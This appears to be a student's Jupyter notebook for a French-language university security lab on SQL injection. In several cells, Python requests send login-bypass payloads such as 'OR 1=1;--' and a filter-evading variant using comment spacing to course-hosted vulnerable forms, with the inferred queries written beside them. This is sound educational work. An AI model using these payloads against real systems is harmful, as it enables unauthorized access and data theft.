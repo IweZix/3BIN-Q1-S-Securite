{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Semaine 2 : Vulnérabilitées web - Injection SQL (1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1a:\n",
    "Pour ce premier exercice, nous vous demandons de passer le formulaire de connexion codé par un mauvais développeur : https://labo.poney.pink/s01/ex1a/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head><title>502 Bad Gateway</title></head>\n",
      "<body>\n",
      "<center><h1>502 Bad Gateway</h1></center>\n",
      "<hr><center>nginx/1.22.1</center>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "Ho non :'-(\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"https://labo.poney.pink/s01/ex1a/\",\n",
    "    data={\n",
    "        # TODO\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "TODO ..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1b:\n",
    "Une variante du précédant formulaire a été mit en place, connectez-vous à nouveau à celui-ci : http://labosecuipl.alwaysdata.net/23/s02/ex1b/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex1b/\",\n",
    "    data={\n",
    "        \"login\": \"'OR 1 = 1;--\"\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT * FROM db.users WHERE login = '<login>' AND password = '<password>'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT * FROM db.users WHERE login = ''OR 1 = 1;--' AND password = '<password>'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2:\n",
    "Une variante du précédant formulaire a été mit en place, connectez-vous à nouveau à celui-ci : https://labo.poney.pink/s01/ex2/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"https://labo.poney.pink/s01/ex2/\",\n",
    "    data={\n",
    "        \"login\": '\") or 1=1;-- ',\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT * FROM db.users WHERE (login=\"<login>\" and `password`=\"<password>\");"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT * FROM db.users WHERE (login=\"\") or 1=1;--\" and `password`=\"\");"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 3:\n",
    "Dans cette nouvelle version, le développeur semble avoir prit conscience que certains caractères ne devraient pas être accepté ... mais vous êtes plus malin que lui, n'est-ce pas ?\n",
    "\n",
    "https://labo.poney.pink/s01/ex3/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ho non :'-(\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"https://labo.poney.pink/s01/ex3/\",\n",
    "    data={\n",
    "        \"login\": \"\\\"OR/**/1/**/LIKE/**/1--\", # \"\\\"OR+1--\"\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 4:\n",
    "Pour ce nouvel exercice, nous allons utiliser un nouveau formulaire. Ce formulaire nous permet de chercher parmi les éléments du tableau périodique des éléments. Par exemple, si vous cherchez \"Co*\", vous obtiendrez les informations sur le copper (cuivre) et le cobalt.\n",
    "\n",
    "https://labo.poney.pink/s01/ex4/\n",
    "\n",
    "Commencez par récupérer le numéro de version de notre base de donnée. Ici, nous connaissons le type de base de donnée : SQLITE, un petit détour par la documentation nous permet deconnaître la fonction parfait pour cela : https://www.sqlite.org/lang_corefunc.html#sqlite_version."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "# TODO"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "TODO ..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 4b:\n",
    "Dans le même ordre d’idée, je vous invite à récupérer la liste des tables présentes dans cette base de donnée.\n",
    "\n",
    "Comme souvent, la lecture de la documentation peut vous faciliter la vie : https://www.sqlite.org/faq.html#q7\n",
    "\n",
    "<sup><sub>(Et comme bien souvent ... la vrai vie c'est compliqué : https://www.sqlite.org/schematab.html#alternative_names )</sub></sup>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "# TODO"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 4c:\n",
    "Maintenant que vous connaissez toutes les tables dans cette base de données ainsi que le nom de chaque champ, pourquoi ne pas récupérer le contenu de chacune de ces tables ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "# TODO"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
